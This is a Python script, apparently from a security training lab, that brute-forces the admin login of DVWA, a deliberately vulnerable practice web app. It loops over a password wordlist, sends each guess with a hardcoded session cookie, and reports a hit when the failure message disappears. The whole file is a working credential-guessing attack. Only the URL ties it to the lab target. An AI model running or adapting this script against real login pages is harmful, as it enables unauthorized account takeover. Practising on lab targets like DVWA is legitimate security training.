import requests
import time

dict_file = '/home/dojo/Desktop/passwords.txt'
u_name_list = ['admin']

def get_http(u_name, p_word):
    head = {'username': 'admin', 'password': p_word, 'Login': 'Login'}
    cookie = {'security': 'low', 'PHPSESSID': 'd6irod0dk38ah8pqdvh6bglfeu'}
    req = requests.get(f'http://dvwa.local/vulnerabilities/brute/?username=admin&password={p_word}&Login=Login#', data=head, cookies=cookie)
    return req.text

if __name__=="__main__":
    total_lines = sum(1 for line in open(dict_file))
    lines_analyzed = 0

    start_time = time.time()
    for u_name in u_name_list:
        f = open(dict_file, 'r')
        for line in f:
            p_word = line.strip()
            result = get_http(u_name, p_word)
            if 'Username and/or password incorrect.' not in result:
                print('Password found: ' + p_word)
                break

            lines_analyzed += 1
            elapsed_time = time.time() - start_time
            if elapsed_time >= 30:
                percentage_analyzed = (lines_analyzed / total_lines) * 100
                print(f'{percentage_analyzed:.2f}% of the file analyzed')
                start_time = time.time()

        f.close()
